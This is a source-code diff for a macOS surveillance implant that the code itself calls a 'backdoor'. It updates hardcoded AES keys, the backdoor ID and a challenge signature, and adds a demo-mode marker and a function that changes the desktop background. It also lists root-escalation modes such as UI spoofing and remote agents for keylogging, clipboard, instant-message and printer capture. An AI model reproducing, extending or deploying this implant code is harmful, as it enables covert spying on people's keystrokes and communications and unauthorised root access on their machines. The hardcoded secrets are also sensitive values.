@@ -32,13 +32,13 @@
 #ifndef DEV_MODE
 char  gLogAesKey[]      = "3j9WmmDgBqyU270FTid3719g64bP4s52"; // default
 #else
-char  gLogAesKey[]      = "-E18Yzo70cIDgzV4MRriFpJn4TOL0E23";
+char  gLogAesKey[]      = "\xa3\xab\x54\x93\x87\xdb\xaa\xb6\x2c\x50\x4f\x91\xad\xd5\x66\x0e";
 #endif
 
 #ifndef DEV_MODE
 char  gConfAesKey[]     = "Adf5V57gQtyi90wUhpb8Neg56756j87R"; // default
 #else
-char  gConfAesKey[]     = "oTfug1JYLAR62r07RLSgpWnPrjSPmnRF";
+char  gConfAesKey[]     = "\x10\x33\x71\x3f\x63\x9c\x1b\x6e\x2f\x5e\xca\xe3\xf5\xb4\x78\x81";
 #endif
 
 // Instance ID (20 bytes) unique per backdoor/user
@@ -46,19 +46,22 @@ char gInstanceId[]  = "bg5etG87q20Kg52W5Fg1";
 
 // Backdoor ID (16 bytes) (NULL terminated)
 #ifndef DEV_MODE
-char gBackdoorID[]  = "av3pVck1gb4eR2d8"; // default
+char gBackdoorID[]    = "av3pVck1gb4eR2d8"; // default
 #else
-char gBackdoorID[16]  = "RCS_0000000307";
+char gBackdoorID[16]  = "RCS_0000000800";
 #endif
 
 // Challenge Key
 #ifndef DEV_MODE
 char gBackdoorSignature[] = "f7Hk0f5usd04apdvqw13F5ed25soV5eD"; //default
 #else
-char gBackdoorSignature[] = "4yeN5zu0+il3Jtcb5a1sBcAdjYFcsD9z";
+char gBackdoorSignature[] = "\x57\x2e\xbc\x94\x39\x12\x81\xcc\xf5\x3a\x85\x13\x30\xbb\x0d\x99";
 #endif
 
-//
+// Demo marker: se la stringa e' uguale a "hxVtdxJ/Z8LvK3ULSnKRUmLE"
+// allora e' in demo altrimenti no demo.
+char gDemoMarker[] = "hxVtdxJ/Z8LvK3ULSnKRUmLE";
+
 // gMode specifies all the possible ways the backdoor can behave:
 //  1 - getRootThroughSLI
 //  2 - getRootThroughUISpoofing
@@ -92,6 +95,8 @@ NSString *gMyXPCName                = @"mdworker_server";
 UInt32    gAgentCrisis              = CRISIS_STOP;
 NSMutableArray  *gAgentCrisisNet    = nil;
 NSMutableArray  *gAgentCrisisApp    = nil;
+NSURL *gOriginalDesktopImage        = nil;
+BOOL  gIsDemoMode                   = FALSE;
 
 u_int remoteAgents[8] = { OFFT_KEYLOG,
                           OFFT_PRINTER,
@@ -102,7 +107,7 @@ u_int remoteAgents[8] = { OFFT_KEYLOG,
                           OFFT_IM,
                           OFFT_CLIPBOARD };
 
-u_int gVersion        = 2011112801;
+u_int gVersion        = 2012041601;
 u_int gSkypeQuality   = 0;
 
 // OS version
@@ -118,13 +123,6 @@ int getBSDProcessList(kinfo_proc **procList, size_t *procCount)
   static const int name[] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0 };
   size_t          length;
   
-  // a valid pointer procList holder should be passed
-  assert(procList != NULL);
-  // But it should not be pre-allocated
-  assert(*procList == NULL);
-  // a valid pointer to procCount should be passed
-  assert(procCount != NULL);
-  
   *procCount = 0;
   
   result = NULL;
@@ -132,8 +130,6 @@ int getBSDProcessList(kinfo_proc **procList, size_t *procCount)
   
   do
     {
-      assert(result == NULL);
-      
       // Call sysctl with a NULL buffer to get proper length
       length = 0;
       err = sysctl((int *)name, (sizeof(name) / sizeof(*name)) - 1, NULL, &length, NULL, 0);
@@ -158,7 +154,6 @@ int getBSDProcessList(kinfo_proc **procList, size_t *procCount)
             done = true;
           else if (err == ENOMEM)
             {
-              assert(result != NULL);
               free(result);
               result = NULL;
               err = 0;
@@ -177,8 +172,6 @@ int getBSDProcessList(kinfo_proc **procList, size_t *procCount)
   *procList = result; // will return the result as procList
   if (err == 0)
     *procCount = length / sizeof(kinfo_proc);
-  
-  assert ((err == 0) == (*procList != NULL ));
   
   return err;
 }  
@@ -201,8 +194,10 @@ NSArray *obtainProcessList()
   
   for (i = 0; i < numProcs; i++)
     {
+      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
       procName = [NSString stringWithFormat: @"%s", allProcs[i].kp_proc.p_comm];
       [processList addObject: [procName lowercaseString]];
+      [innerPool release];
     }
   
   free(allProcs);
@@ -248,6 +243,8 @@ NSArray *obtainProcessListWithPid()
 
 BOOL findProcessWithName(NSString *aProcess)
 {
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
   NSArray *processList;
   
   processList = obtainProcessList();
@@ -260,11 +257,15 @@ BOOL findProcessWithName(NSString *aProcess)
                        [[aProcess lowercaseString] UTF8String]))
         {
           [processList release];
+          [pool release];
           return YES;
         }
     }
   
   [processList release];
+  
+  [pool release];
+  
   return NO;
 }
 
@@ -1119,13 +1120,13 @@ BOOL is64bitKernel()
   int res = uname(&un);
   if (res == -1)
     {
-#ifdef DEBUG_CORE
+#ifdef DEBUG_COMMON
       errorLog(@"Error while retrieving machine type");
 #endif
       return NO;
     }
   
-#ifdef DEBUG_CORE
+#ifdef DEBUG_COMMON
   verboseLog(@"machine type: %s", un.machine);
 #endif
   
@@ -1140,6 +1141,40 @@ BOOL is64bitKernel()
     {
       return NO;
     }
+}
+
+// FIXED-
+void changeDesktopBg(NSString *aFilePath, BOOL wantToRestoreOriginal)
+{
+  NSURL *image;
+  NSURL *origImageUrl;
+  NSWorkspace *sws = [NSWorkspace sharedWorkspace];
+  
+  if (wantToRestoreOriginal)
+    {
+      if (gOriginalDesktopImage != nil)
+        image = gOriginalDesktopImage;
+      else
+        return;
+    }
+  else
+    {
+      for (NSScreen *screen in [NSScreen screens]) 
+        origImageUrl = [sws desktopImageURLForScreen: screen];
+        
+      image = [NSURL fileURLWithPath: aFilePath];
+    }
+    
+  NSError *err = nil;
+  
+  for (NSScreen *screen in [NSScreen screens]) 
+    {
+      NSDictionary *opt = [sws desktopImageOptionsForScreen:screen];        
+      [sws setDesktopImageURL:image forScreen:screen options:opt error:&err];
+    }
+  
+  if (wantToRestoreOriginal == NO)
+    gOriginalDesktopImage = origImageUrl;
 }
 
 #ifdef DEMO_VERSION
